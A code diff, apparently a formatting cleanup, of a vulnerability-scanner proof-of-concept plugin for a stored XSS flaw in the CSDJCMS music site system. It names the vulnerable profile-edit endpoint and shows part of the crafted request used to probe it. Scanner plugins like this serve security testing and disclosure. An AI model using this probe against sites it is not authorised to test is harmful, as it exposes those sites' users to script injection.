@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import urlparse
 
+
 class Vuln(ABVuln):
-    vuln_id = 'CSDJCMS_0003' # 平台漏洞编号
+    vuln_id = 'CSDJCMS_0003'  # 平台漏洞编号
     name = 'CSDJCMS(程氏舞曲管理系统) 储存型XSS'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.XSS # 漏洞类型
+    type = VulnType.XSS  # 漏洞类型
     disclosure_date = '2013-11-11'  # 漏洞公布时间
     desc = '''
         CSDJCMS(程氏舞曲管理系统) /user/do.php?ac=edit@op=zl。
@@ -18,6 +19,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'CSDJCMS(程氏舞曲管理系统)'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '316cadca-b0db-45c8-a2a4-5424eb088cdc'
@@ -31,8 +33,8 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #https://wooyun.shuimugan.com/bug/view?bug_no=42552
+
+            # https://wooyun.shuimugan.com/bug/view?bug_no=42552
             payload = '/user/do.php?ac=edit@op=zl'
             url = self.target + payload
             hh = hackhttp.hackhttp()
@@ -61,6 +63,7 @@ CS_Name=aaaaaa&CS_Email=a%40qq.com&CS_Nichen=aaaaaa&CS_Sex=0&CS_City=%C1%C9%C4%F
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
